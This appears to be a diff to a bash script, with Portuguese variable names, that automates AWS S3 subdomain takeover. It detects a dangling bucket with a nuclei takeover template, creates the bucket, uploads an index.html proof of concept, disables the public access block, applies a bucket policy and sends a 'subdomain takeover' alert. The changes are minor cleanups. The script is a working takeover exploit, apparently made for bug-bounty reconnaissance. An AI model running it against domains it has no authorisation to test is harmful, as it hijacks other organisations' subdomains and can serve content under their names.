@@ -1,7 +1,5 @@
+
 #!/bin/bash
-echo -e
-echo -e
-echo -e
 alvo="$1"
 
 
@@ -11,7 +9,7 @@ bucket=$(echo "$alvo" | nuclei -t /root/nuclei-templates/http/takeovers/aws-buck
 if [ "$bucket" != '' ]; then
 createbucket=$(aws s3api create-bucket --bucket "$alvo" --region us-east-1)
 
-echo saidacreatebucket "$createbucket"
+echo "saidacreatebucket $createbucket"
 
 sleep 10;
 
@@ -25,7 +23,7 @@ cppoc=$(aws s3 cp index.html s3://"$alvo"/)
 
 
 echo "etapa desbloqueando bucket"
-desbloqueandobucket=$(aws s3api put-public-access-block     --bucket "$alvo"  --public-access-block-configuration "BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets>
+desbloqueandobucket=$(aws s3api put-public-access-block     --bucket "$alvo"  --public-access-block-configuration "BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false")
 
 echo "etapa criando policita de objeto"
 sed -i  "s/alvo/$alvo/g" policytakeoveraws.json
@@ -36,6 +34,6 @@ echo "subdomain takeover em $bucket" | notify
 
 else
 
-exit 0;
+exit 0
 
 fi
